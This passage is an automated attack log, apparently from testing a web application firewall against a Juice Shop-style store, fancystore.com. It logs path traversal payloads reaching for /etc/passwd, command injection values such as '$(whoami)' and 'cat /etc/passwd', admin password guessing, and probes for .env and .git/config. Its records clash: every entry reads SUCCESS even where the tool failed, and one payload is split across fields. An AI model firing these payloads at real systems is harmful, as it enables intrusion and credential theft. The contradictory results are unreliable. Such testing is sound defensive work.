+  [REAL ATTACK] Using Gobuster for directory traversal testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/assetsPublic/download
+  [FAILED] No directory traversal detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No traversal indicators found
+===ATTACK_END===
+PAYLOAD_ID: 27
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:43Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 28
+LINE_NUM: 51
+ATTACK_TYPE: traversal
+TOOL: gobuster
+DESCRIPTION: URL-encoded traversal
+METHOD: GET
+PATH: /assetsPublic/download
+DATA: wordlist=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:44Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951124_7758
+    X-Payload-ID: payload_28
+    X-Attack-Type: traversal
+    X-Timestamp: 2025-07-31T08:38:44Z
+  [REAL ATTACK] Using Gobuster for directory traversal testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/assetsPublic/download
+  [FAILED] No directory traversal detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No traversal indicators found
+===ATTACK_END===
+PAYLOAD_ID: 28
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:44Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 29
+LINE_NUM: 52
+ATTACK_TYPE: traversal
+TOOL: gobuster
+DESCRIPTION: Double URL-encoded traversal
+METHOD: GET
+PATH: /assetsPublic/download
+DATA: wordlist=..%252f..%252f..%252f..%252fetc%252fpasswd
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:45Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951125_12165
+    X-Payload-ID: payload_29
+    X-Attack-Type: traversal
+    X-Timestamp: 2025-07-31T08:38:45Z
+  [REAL ATTACK] Using Gobuster for directory traversal testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/assetsPublic/download
+  [FAILED] No directory traversal detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No traversal indicators found
+===ATTACK_END===
+PAYLOAD_ID: 29
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:45Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 30
+LINE_NUM: 53
+ATTACK_TYPE: traversal
+TOOL: gobuster
+DESCRIPTION: UTF-8 encoded traversal
+METHOD: GET
+PATH: /assetsPublic/download
+DATA: wordlist=..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:46Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951126_28596
+    X-Payload-ID: payload_30
+    X-Attack-Type: traversal
+    X-Timestamp: 2025-07-31T08:38:46Z
+  [REAL ATTACK] Using Gobuster for directory traversal testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/assetsPublic/download
+  [FAILED] No directory traversal detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No traversal indicators found
+===ATTACK_END===
+PAYLOAD_ID: 30
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:46Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 31
+LINE_NUM: 54
+ATTACK_TYPE: traversal
+TOOL: gobuster
+DESCRIPTION: Double dot traversal
+METHOD: GET
+PATH: /assetsPublic/download
+DATA: wordlist=....//....//....//etc/passwd
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:47Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951127_13681
+    X-Payload-ID: payload_31
+    X-Attack-Type: traversal
+    X-Timestamp: 2025-07-31T08:38:47Z
+  [REAL ATTACK] Using Gobuster for directory traversal testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/assetsPublic/download
+  [FAILED] No directory traversal detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No traversal indicators found
+===ATTACK_END===
+PAYLOAD_ID: 31
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:47Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 32
+LINE_NUM: 55
+ATTACK_TYPE: traversal
+TOOL: gobuster
+DESCRIPTION: Windows path traversal
+METHOD: GET
+PATH: /assetsPublic/download
+DATA: wordlist=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:48Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951128_28322
+    X-Payload-ID: payload_32
+    X-Attack-Type: traversal
+    X-Timestamp: 2025-07-31T08:38:48Z
+  [REAL ATTACK] Using Gobuster for directory traversal testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/assetsPublic/download
+  [FAILED] No directory traversal detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No traversal indicators found
+===ATTACK_END===
+PAYLOAD_ID: 32
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:49Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 33
+LINE_NUM: 60
+ATTACK_TYPE: cmd_injection
+TOOL: commix
+DESCRIPTION: Command injection with semicolon
+METHOD: POST
+PATH: /rest/admin/application-configuration
+DATA: {"serverName":"test; ls -la"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:50Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951130_22706
+    X-Payload-ID: payload_33
+    X-Attack-Type: command_injection
+    X-Timestamp: 2025-07-31T08:38:50Z
+  [REAL ATTACK] Using Commix for command injection testing...
+  [INFO] Commix available, using professional tool
+  [TOOL_USED] commix
+  [INFO] Running Commix against: http://fancystore.com/rest/admin/application-configuration
+  [SUCCESS] Command injection detected by Commix (HTTP 500)
+  [TOOL_OUTPUT] /tmp/commix_output.txt
+  [TOOL_STATUS] SUCCESS - Commix completed
+===ATTACK_END===
+PAYLOAD_ID: 33
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:50Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 34
+LINE_NUM: 61
+ATTACK_TYPE: cmd_injection
+TOOL: commix
+DESCRIPTION: Command injection with AND
+METHOD: POST
+PATH: /rest/admin/application-configuration
+DATA: {"serverName":"test && whoami"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:51Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951131_31658
+    X-Payload-ID: payload_34
+    X-Attack-Type: command_injection
+    X-Timestamp: 2025-07-31T08:38:51Z
+  [REAL ATTACK] Using Commix for command injection testing...
+  [INFO] Commix available, using professional tool
+  [TOOL_USED] commix
+  [INFO] Running Commix against: http://fancystore.com/rest/admin/application-configuration
+  [SUCCESS] Command injection detected by Commix (HTTP 500)
+  [TOOL_OUTPUT] /tmp/commix_output.txt
+  [TOOL_STATUS] SUCCESS - Commix completed
+===ATTACK_END===
+PAYLOAD_ID: 34
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:51Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 35
+LINE_NUM: 62
+ATTACK_TYPE: cmd_injection
+TOOL: commix
+DESCRIPTION: block|Command injection with pipe
+METHOD: POST
+PATH: /rest/admin/application-configuration
+DATA: {"serverName":"test 
+EXPECTED:  cat /etc/passwd"}
+WAF_MODE: 401
+TIMESTAMP: 2025-07-31T08:38:52Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951132_27321
+    X-Payload-ID: payload_35
+    X-Attack-Type: command_injection
+    X-Timestamp: 2025-07-31T08:38:52Z
+  [REAL ATTACK] Using Commix for command injection testing...
+  [INFO] Commix available, using professional tool
+  [TOOL_USED] commix
+  [INFO] Running Commix against: http://fancystore.com/rest/admin/application-configuration
+  [SUCCESS] Command injection detected by Commix (HTTP 500)
+  [TOOL_OUTPUT] /tmp/commix_output.txt
+  [TOOL_STATUS] SUCCESS - Commix completed
+===ATTACK_END===
+PAYLOAD_ID: 35
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:52Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 36
+LINE_NUM: 63
+ATTACK_TYPE: cmd_injection
+TOOL: commix
+DESCRIPTION: Command injection with backticks
+METHOD: POST
+PATH: /rest/admin/application-configuration
+DATA: {"serverName":"test`id`"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:53Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951133_31724
+    X-Payload-ID: payload_36
+    X-Attack-Type: command_injection
+    X-Timestamp: 2025-07-31T08:38:53Z
+  [REAL ATTACK] Using Commix for command injection testing...
+  [INFO] Commix available, using professional tool
+  [TOOL_USED] commix
+  [INFO] Running Commix against: http://fancystore.com/rest/admin/application-configuration
+  [SUCCESS] Command injection detected by Commix (HTTP 500)
+  [TOOL_OUTPUT] /tmp/commix_output.txt
+  [TOOL_STATUS] SUCCESS - Commix completed
+===ATTACK_END===
+PAYLOAD_ID: 36
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:53Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 37
+LINE_NUM: 64
+ATTACK_TYPE: cmd_injection
+TOOL: commix
+DESCRIPTION: Command injection with subshell
+METHOD: POST
+PATH: /rest/admin/application-configuration
+DATA: {"serverName":"test$(whoami)"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:54Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951134_2126
+    X-Payload-ID: payload_37
+    X-Attack-Type: command_injection
+    X-Timestamp: 2025-07-31T08:38:54Z
+  [REAL ATTACK] Using Commix for command injection testing...
+  [INFO] Commix available, using professional tool
+  [TOOL_USED] commix
+  [INFO] Running Commix against: http://fancystore.com/rest/admin/application-configuration
+  [SUCCESS] Command injection detected by Commix (HTTP 500)
+  [TOOL_OUTPUT] /tmp/commix_output.txt
+  [TOOL_STATUS] SUCCESS - Commix completed
+===ATTACK_END===
+PAYLOAD_ID: 37
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:54Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 38
+LINE_NUM: 65
+ATTACK_TYPE: cmd_injection
+TOOL: commix
+DESCRIPTION: URL encoded command injection
+METHOD: POST
+PATH: /rest/admin/application-configuration
+DATA: {"serverName":"test%3B ls -la"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:55Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951135_16444
+    X-Payload-ID: payload_38
+    X-Attack-Type: command_injection
+    X-Timestamp: 2025-07-31T08:38:55Z
+  [REAL ATTACK] Using Commix for command injection testing...
+  [INFO] Commix available, using professional tool
+  [TOOL_USED] commix
+  [INFO] Running Commix against: http://fancystore.com/rest/admin/application-configuration
+  [SUCCESS] Command injection detected by Commix (HTTP 500)
+  [TOOL_OUTPUT] /tmp/commix_output.txt
+  [TOOL_STATUS] SUCCESS - Commix completed
+===ATTACK_END===
+PAYLOAD_ID: 38
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:55Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 39
+LINE_NUM: 70
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Common admin credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=admin
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:56Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951136_15924
+    X-Payload-ID: payload_39
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:38:56Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 39
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:56Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 40
+LINE_NUM: 71
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Default password
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=password
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:57Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951137_6973
+    X-Payload-ID: payload_40
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:38:57Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 40
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:57Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 41
+LINE_NUM: 72
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Weak password
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=123456
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:58Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951138_20624
+    X-Payload-ID: payload_41
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:38:58Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 41
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:58Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 42
+LINE_NUM: 73
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Admin with numbers
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=admin123
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:59Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951139_14241
+    X-Payload-ID: payload_42
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:38:59Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [SUCCESS] Authentication bypass detected by Hydra (HTTP 200)
+  [TOOL_OUTPUT] /tmp/hydra_output.txt
+  [TOOL_STATUS] SUCCESS - Hydra completed
+===ATTACK_END===
+PAYLOAD_ID: 42
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:59Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 43
+LINE_NUM: 74
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Admin with symbols
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=admin@123
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:00Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951140_2859
+    X-Payload-ID: payload_43
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:00Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 43
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:00Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 44
+LINE_NUM: 75
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Email as password
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=admin@juice-sh.op
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:02Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951142_31428
+    X-Payload-ID: payload_44
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:02Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 44
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:02Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 45
+LINE_NUM: 80
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: URL-encoded credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=pa%73%73word
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:39:03Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951143_23348
+    X-Payload-ID: payload_45
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:03Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 45
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:03Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 46
+LINE_NUM: 81
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Hex-encoded credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=p%61ssw%6frd
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:39:04Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951144_6290
+    X-Payload-ID: payload_46
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:04Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 46
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:04Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 47
+LINE_NUM: 82
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Unicode-encoded credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=p%u0061ssw%u006frd
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:39:05Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951145_14249
+    X-Payload-ID: payload_47
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:05Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 47
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:05Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 48
+LINE_NUM: 83
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Null-byte encoded credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=p%00assw%00ord
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:39:06Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951146_9491
+    X-Payload-ID: payload_48
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:06Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 48
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:06Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 49
+LINE_NUM: 84
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: Newline-encoded credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=p%0aassw%0aord
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:39:07Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951147_18534
+    X-Payload-ID: payload_49
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:07Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 49
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:07Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 50
+LINE_NUM: 85
+ATTACK_TYPE: auth_bypass
+TOOL: hydra
+DESCRIPTION: CR-encoded credentials
+METHOD: POST
+PATH: /rest/user/login
+DATA: userlist=admin@juice-sh.op passlist=p%0dassw%0dord
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:39:08Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951148_7697
+    X-Payload-ID: payload_50
+    X-Attack-Type: auth_bypass
+    X-Timestamp: 2025-07-31T08:39:08Z
+  [REAL ATTACK] Using Hydra for authentication bypass testing...
+  [INFO] Hydra available, using professional tool
+  [TOOL_USED] hydra
+  [INFO] Running Hydra against: http://fancystore.com/rest/user/login
+  [FAILED] No authentication bypass detected (HTTP 401)
+  [TOOL_STATUS] FAILED - No authentication bypass indicators found
+===ATTACK_END===
+PAYLOAD_ID: 50
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:39:09Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 51
+LINE_NUM: 90
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Environment file access
+METHOD: GET
+PATH: /.env
+DATA: wordlist=.env
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:10Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951150_19322
+    X-Payload-ID: payload_51
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:10Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/.env
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 51
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:10Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 52
+LINE_NUM: 91
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Configuration file access
+METHOD: GET
+PATH: /config.js
+DATA: wordlist=config.js
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:11Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951151_1308
+    X-Payload-ID: payload_52
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:11Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/config.js
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 52
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:11Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 53
+LINE_NUM: 92
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Package config access
+METHOD: GET
+PATH: /package.json
+DATA: wordlist=package.json
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:12Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951152_15627
+    X-Payload-ID: payload_53
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:12Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/package.json
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 53
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:12Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 54
+LINE_NUM: 93
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Git config access
+METHOD: GET
+PATH: /.git/config
+DATA: wordlist=.git/config
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:13Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951153_22037
+    X-Payload-ID: payload_54
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:13Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/.git/config
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 54
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:13Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 55
+LINE_NUM: 94
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Database backup access
+METHOD: GET
